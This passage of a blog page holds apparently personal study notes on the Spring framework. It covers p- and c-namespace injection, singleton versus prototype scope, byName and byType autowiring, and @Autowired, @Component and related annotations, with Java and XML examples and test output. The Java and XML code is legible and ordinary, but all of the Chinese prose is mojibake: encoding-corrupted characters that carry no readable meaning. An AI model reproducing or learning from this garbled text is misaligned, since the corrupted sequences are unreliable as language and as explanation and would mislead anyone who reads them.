class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘åœ¨è¿™é‡Œè§‰å¾—æ¯”è¾ƒé‡è¦çš„åŒºåˆ«å°±æ˜¯åœ¨äºpropå’Œmapå½“ä¸­çš„å·®åˆ«</p>
<p>mapå› ä¸ºå¼ºè°ƒçš„æ˜¯é”®å€¼å¯¹å…³ç³»ï¼Œæ‰€ä»¥å†™åœ¨mapçš„æ ‡ç­¾å½“ä¸­ï¼Œè€Œpropä¸­çš„å€¼å®¹æ˜“ä¿®æ”¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å†™åœ¨æ ‡ç­¾ä¸­é—´ã€‚</p>
<p>æ€»è€Œè¨€ä¹‹è®°ä½å°±å¥½äº†         </p>
<p>æµ‹è¯•ç»“æœå¦‚ä¸‹ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Student&#123;address=Address&#123;address=&#x27;å®‰å¾½èŠœæ¹–ä¸­å‡º&#x27;&#125;, name=&#x27;æœˆçŸ³&#x27;,</span><br><span class="line">books=[JavaåŸºç¡€, Javaè¿›ç¨‹, Javaç¼–å†™, JavaIOC, JavaSpring],</span><br><span class="line">hobbies=[å”±æ­Œ, ä¸‹æ£‹, ç¡è§‰], </span><br><span class="line">cards=&#123;æœˆæ›œ=1751111, æœˆçŸ³=138217&#125;, </span><br><span class="line">games=[æˆ˜åœ°, ä½¿å‘½å¬å”¤, EA, å¥¥é‡Œç»™], wife=&#x27;null&#x27;, </span><br><span class="line">info=&#123;password=æœˆæ›œ, url=/weibos?SSL=xxx, divers=mysql, username=æœˆçŸ³&#125;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="4-3-æ‹“å±•æ–¹å¼æ³¨å…¥"><a href="#4-3-æ‹“å±•æ–¹å¼æ³¨å…¥" class="headerlink" title="4.3 æ‹“å±•æ–¹å¼æ³¨å…¥"></a>4.3 æ‹“å±•æ–¹å¼æ³¨å…¥</h2><p>é™¤äº†ä¸Šé¢çš„ä¾èµ–æ³¨å…¥ä»¥å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨På‘½åç©ºé—´å’ŒCå‘½åç©ºé—´æ³¨å…¥ï¼Œä½†æ˜¯ä»–ä»¬å¿…é¡»åˆ©ç”¨XMLçº¦æŸã€‚</p>
<p>å…·ä½“ä¾‹å­å¦‚ä¸‹ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.User&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æœˆçŸ³&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">value</span>=<span class="string">&quot;20&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.User&quot;</span> <span class="attr">id</span>=<span class="string">&quot;user2&quot;</span> <span class="attr">p:age</span>=<span class="string">&quot;20&quot;</span> <span class="attr">p:name</span>=<span class="string">&quot;æœˆæ›œ&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user3&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.User&quot;</span> <span class="attr">c:age</span>=<span class="string">&quot;21&quot;</span> <span class="attr">c:name</span>=<span class="string">&quot;æœˆç¬™&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ClassPathXmlApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;bean2.xml&quot;</span>);</span><br><span class="line">    User user = context.getBean(<span class="string">&quot;user&quot;</span>, User.class);</span><br><span class="line">    User user2 = context.getBean(<span class="string">&quot;user2&quot;</span>, User.class);</span><br><span class="line"></span><br><span class="line">    System.out.println(user);</span><br><span class="line">    System.out.println(user2);</span><br><span class="line">    User user3 = context.getBean(<span class="string">&quot;user3&quot;</span>, User.class);</span><br><span class="line"></span><br><span class="line">    System.out.println(user3);</span><br></pre></td></tr></table></figure>

<p>ï¼ˆæƒ³ä½¿ç”¨testè®°å¾—å¯¼å…¥junitå“¦</p>
<p>ç›¸åŒçš„ï¼Œä½¿ç”¨cæ ‡ç­¾å°±ç›¸å½“äºä½¿ç”¨æ„é€ å™¨å‘¢ã€‚</p>
<p>é‚£ä¹ˆç©ä»€ä¹ˆè¦ä½¿ç”¨cæ ‡ç­¾å’Œpæ ‡ç­¾å‘¢ï¼Ÿ</p>
<p>æˆ‘çŒœæƒ³æ˜¯å¦‚æœæˆ‘ä»¬å¯¹è¿™ç§ç®€å•çš„æ³¨å…¥æ–¹å¼ç»Ÿä¸€çš„ä½¿ç”¨æ ‡ç­¾æ¥è¿›è¡Œæ³¨å…¥ï¼Œè€Œå¤æ‚çš„ä½¿ç”¨propæ¥è¿›è¡Œæ³¨å…¥ï¼Œå¯ä»¥ç®€åŒ–æˆ‘ä»¬çš„ä»£ç ï¼Œå½“xmlç¹ççš„æ—¶å€™ä¹Ÿä¸è‡³äºä¸€å¡Œç³Šæ¶‚äº†æŠŠ</p>
<p>å®˜æ–¹æ–‡æ¡£ï¼š</p>
<p>namespace is not as flexible as the standard XML format. For example, the format for declaring property references clashes with properties that end in Ref, whereas the standard XML format does not. We recommend that you choose your approach carefully and communicate this to your team members, to avoid producing XML documents that use all three approaches at the same time.</p>
<p>æ„æ€æ˜¯ä¸å¤Ÿçµæ´»ï¼ŒåŒæ—¶éœ€è¦ä¸å›¢é˜Ÿæ²Ÿé€šå¥½ï¼Œä½†æ˜¯å¯ä»¥ç®€åŒ–ä»£ç ï¼Ÿ</p>
<h1 id="5-Beançš„ä½œç”¨åŸŸ"><a href="#5-Beançš„ä½œç”¨åŸŸ" class="headerlink" title="5 Beançš„ä½œç”¨åŸŸ"></a>5 Beançš„ä½œç”¨åŸŸ</h1><p>ä¸»è¦æ˜¯æ¢è®¨åŸå‹å’Œå•ä¾‹ä¹‹é—´çš„å·®è·ï¼š</p>
<ul>
<li><p>å•ä¾‹ï¼š</p>
<p>ä¹‹åæˆ‘ä»¬åˆ›å»ºçš„æ—¶å€™å³ä½¿åˆ›å»ºå¾ˆå¤šä¸ªç±»ï¼Œä¾ç„¶åªæœ‰ä¸€ä¸ªåŸå‹</p>
</li>
<li><p>å¤šä¾‹ï¼š</p>
<p>æ¯åˆ›å»ºä¸€ä¸ªæ–°çš„ç±»éƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ç±»</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;bean class&#x3D;&quot;com.ys.pojo.User&quot; id&#x3D;&quot;user2&quot; p:age&#x3D;&quot;20&quot; p:name&#x3D;&quot;æœˆæ›œ&quot; scope&#x3D;&quot;prototype&quot;&#x2F;&gt;</span><br><span class="line">&lt;bean class&#x3D;&quot;com.ys.pojo.User&quot; id&#x3D;&quot;user2&quot; p:age&#x3D;&quot;20&quot; p:name&#x3D;&quot;æœˆæ›œ&quot; scope&#x3D;&quot;singleton&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p>æµ‹è¯•ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">User user = context.getBean(<span class="string">&quot;user&quot;</span>, User.class);</span><br><span class="line">       User user2 = context.getBean(<span class="string">&quot;user&quot;</span>, User.class);</span><br><span class="line">       System.out.println(user.hashCode());</span><br><span class="line">       System.out.println(user2.hashCode());</span><br><span class="line">       System.out.println(user==user2);</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°ç»“æœï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1075738627</span></span><br><span class="line"><span class="number">282828951</span></span><br><span class="line"><span class="keyword">false</span></span><br></pre></td></tr></table></figure>



<h1 id="6-Beançš„è‡ªåŠ¨è£…é…"><a href="#6-Beançš„è‡ªåŠ¨è£…é…" class="headerlink" title="6. Beançš„è‡ªåŠ¨è£…é…"></a>6. Beançš„è‡ªåŠ¨è£…é…</h1><ul>
<li>è‡ªåŠ¨è£…é…æ˜¯Springæ»¡è¶³beanä¾èµ–çš„ä¸€ç§æ–¹å¼ï¼</li>
<li>Springä¼šåœ¨ä¸Šä¸‹æ–‡ä¸­è‡ªåŠ¨å¯»æ‰¾ï¼Œå¹¶è‡ªåŠ¨ç»™beanè£…é…å±æ€§</li>
</ul>
<p>åœ¨Springä¸­æœ‰ä¸‰ç§è‡ªåŠ¨è£…é…çš„æ–¹å¼ï¼š</p>
<ol>
<li>åœ¨XMLä¸­æ˜¾å¼çš„é…ç½®</li>
<li>åœ¨Javaä¸­æ˜¾å¼çš„é…ç½®</li>
<li>éšå¼çš„è‡ªåŠ¨è£…é…beanã€é‡è¦ã€‘</li>
</ol>
<h2 id="6-1-æµ‹è¯•ç¯å¢ƒ"><a href="#6-1-æµ‹è¯•ç¯å¢ƒ" class="headerlink" title="6.1 æµ‹è¯•ç¯å¢ƒ"></a>6.1 æµ‹è¯•ç¯å¢ƒ</h2><ol>
<li>ä¸€ä¸ªäººæœ‰ä¸¤æ¡ç‹—ï¼</li>
</ol>
<p>Catï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cat</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shout</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;miao&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>Dogï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dog</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shout</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;wang&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>Personï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Cat cat;</span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Cat <span class="title">getCat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cat;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCat</span><span class="params">(Cat cat)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cat = cat;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Dog <span class="title">getDog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> dog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDog</span><span class="params">(Dog dog)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.dog = dog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;cat=&quot;</span> + cat +</span><br><span class="line">                <span class="string">&quot;, dog=&quot;</span> + dog +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>beans.xml:</p>
<p>byNameé…ç½®ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cat&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.Cat&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dog&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.Dog&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;person&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.Person&quot;</span> <span class="attr">autowire</span>=<span class="string">&quot;byName&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æœˆçŸ³&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>byTypeï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span>  <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.Cat&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span>  <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.Dog&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;person&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.Person&quot;</span> <span class="attr">autowire</span>=<span class="string">&quot;byType&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æœˆçŸ³&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>byNameå°±æ˜¯åœ¨ä¸Šä¸‹æ–‡ä¸­å¯»æ‰¾idå’Œæ‰€éœ€æ±‚åŒ¹é…çš„å€¼ï¼Œè€ŒbyTypeåˆ™æ˜¯åœ¨ä¸Šä¸‹æ–‡ä¸­å»å¯»æ‰¾å’Œç±»å‹ç›¸åŒç±»</p>
<p>äºæ˜¯æˆ‘åˆäº§ç”Ÿäº†ä¸€ä¸ªç–‘æƒ‘ï¼Œå¦‚æœå­˜åœ¨è·¨æ–‡ä»¶çš„æƒ…å†µå‘¢ï¼Ÿ</p>
<p>äºæ˜¯æˆ‘åˆåˆ›å»ºäº†ä¸€ä¸ªbean1.xmlæ¥å‚¨å­˜</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;person&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.Person&quot;</span> <span class="attr">autowire</span>=<span class="string">&quot;byName&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;dnm&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°ç»“æœï¼š</p>
<p>æœˆçŸ³ miao wang</p>
<p>ä½†æ˜¯å¦‚æœæˆ‘æŠŠbeansçš„æ³¨é‡Šä¹‹åå‘¢</p>
<p>åˆ™æ˜¯</p>
<p>dnm miao wang</p>
<p>è¿™å°±è¯´æ˜ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨beans.xmlè£…é…ä¹‹åï¼Œç³»ç»Ÿä¼šä¼˜å…ˆåœ¨å½“å‰xmlæ¥è¿›è¡ŒæŸ¥æ‰¾ï¼Œä¹‹åæ‰ä¼šå»å…¶ä»–åœ°æ–¹æŸ¥æ‰¾</p>
<p>é™¤æ­¤ä¹‹å¤–æˆ‘ä»¬éœ€è¦è®°ä½ï¼š</p>
<ul>
<li>å½“æˆ‘ä»¬ä½¿ç”¨byNameçš„æ—¶å€™ï¼Œå¿…é¡»ä¿è¯å½“å‰beançš„idå”¯ä¸€ä¸”æ­£ç¡®</li>
<li>å½“æˆ‘ä»¬ä½¿ç”¨byTypeçš„æ—¶å€™ï¼Œå¿…é¡»ä¿è¯å½“å‰beançš„classå”¯ä¸€ä¸”æ­£ç¡®</li>
</ul>
<h2 id="6-2ä½¿ç”¨æ³¨è§£å®ç°è‡ªåŠ¨è£…é…"><a href="#6-2ä½¿ç”¨æ³¨è§£å®ç°è‡ªåŠ¨è£…é…" class="headerlink" title="6.2ä½¿ç”¨æ³¨è§£å®ç°è‡ªåŠ¨è£…é…"></a>6.2ä½¿ç”¨æ³¨è§£å®ç°è‡ªåŠ¨è£…é…</h2><p>jdk1.5æ”¯æŒï¼Œspring2.5æ”¯æŒ</p>
<p>ä½¿ç”¨æ³¨è§£é¡»çŸ¥ï¼š</p>
<ol>
<li>å¯¼å…¥çº¦æŸ</li>
<li>é…ç½®æ³¨è§£çš„æ”¯æŒ</li>
</ol>
<p>å¿…é¡»å¯¼å…¥å¦‚ä¸‹é…ç½®ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">       http://springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">       http://springframework.org/schema/context/spring-context.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">       https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¹‹åæˆ‘ä»¬ä¾¿å¯ä»¥å¯¹å•ä¸ªå€¼è¿›è¡Œæ³¨å…¥ã€‚</p>
<p>åœ¨Personç±»å½“ä¸­ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Cat cat;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Cat <span class="title">getCat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cat;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCat</span><span class="params">(Cat cat)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cat = cat;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Dog <span class="title">getDog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> dog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDog</span><span class="params">(Dog dog)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.dog = dog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;cat=&quot;</span> + cat +</span><br><span class="line">                <span class="string">&quot;, dog=&quot;</span> + dog +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å½“æˆ‘ä»¬ä½¿ç”¨atuowiredæ³¨å…¥ä¹‹åï¼Œç”šè‡³è¿setæ–¹æ³•éƒ½ä¸éœ€è¦æ„é€ äº†ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</p>
<p>ã€æ®è¯´æ˜¯å› ä¸ºä»–åˆ©ç”¨åå°„çš„æ–¹å¼è·å–ä»£ç ï¼Œæˆ‘ä¹Ÿä¸æ˜¯å¾ˆæ‡‚</p>
<p>å¦‚æœbeanå½“ä¸­çš„é…ç½®å¤šèµ·æ¥äº†ï¼Œæˆ‘ä»¬æƒ³æ„é€ çš„è¯ï¼Œå°±éœ€è¦é€šè¿‡</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Qualifier(value = &quot;cat&quot;)</span></span><br></pre></td></tr></table></figure>

<p>æ˜¾å¼çš„å®šä¹‰ä»£ç </p>
<h1 id="7-æ³¨è§£å¼€å‘"><a href="#7-æ³¨è§£å¼€å‘" class="headerlink" title="7.æ³¨è§£å¼€å‘"></a>7.æ³¨è§£å¼€å‘</h1><p>åœ¨Spring4ä¹‹åï¼Œæˆ‘ä»¬å¿…é¡»ä¿è¯Springçš„AOPåŒ…è¢«å¯¼å…¥</p>
<p>åœ¨ä½¿ç”¨æ³¨è§£çš„æ—¶å€™éœ€è¦å¯¼å…¥contextçº¦æŸï¼Œå¢åŠ æ³¨è§£çš„æ”¯æŒ</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">       http://springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">       http://springframework.org/schema/context/spring-context.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">       https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br></pre></td></tr></table></figure>



<ol>
<li><p>bean</p>
<p>å½“æˆ‘ä»¬ä½¿ç”¨æ³¨è§£ä¹‹åï¼Œbeanå¯ä»¥å¦‚ä¸‹æ–¹æ³•è¿›å…¥å¯¼å…¥ï¼š</p>
<p>ç¬¬ä¸€æ­¥ï¼Œå¯¼å…¥åŒ…ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.ys&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒæ­¥ï¼Œå»ç±»çš„ä¸Šé¢æ·»åŠ æ³¨é‡Šï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„@Componentï¼Œè¿™ä¸ªæ³¨è§£çš„æ„æ€ç­‰ä»·äº</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&#x27;user&#x27;</span> <span class="attr">class</span>=<span class="string">com.ys.pojo.user</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>å±æ€§å¦‚ä½•æ³¨å…¥</p>
<p>ä½¿ç”¨ç±»æˆ‘ä»¬ä¹Ÿæ˜¯å¯ä»¥æ³¨å…¥å€¼çš„ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Value(&quot;æœˆçŸ³&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br></pre></td></tr></table></figure>

<p>ç­‰ä»·äºï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.User&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æœˆçŸ³&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯é€šè¿‡è¿™æˆ‘ä»¬å°±å¯ä»¥æ˜ç™½ï¼Œæ³¨è§£æ³¨å…¥å€¼ä¸é€‚åˆæ³¨å…¥å¤æ‚ç±»å‹çš„å€¼ã€‚</p>
</li>
<li><p>è¡ç”Ÿçš„æ³¨è§£</p>
<p>é€šè¿‡@Componentåé¢ä¸ºäº†åˆ†å±‚ï¼Œæˆ‘ä»¬è¡ç”Ÿå‡ºäº†å¦‚ä¸‹æ³¨è§£ï¼š</p>
<ul>
<li>Dao:  @Repository</li>
<li>Service:  @Service</li>
<li>Controller: @Controller</li>
</ul>
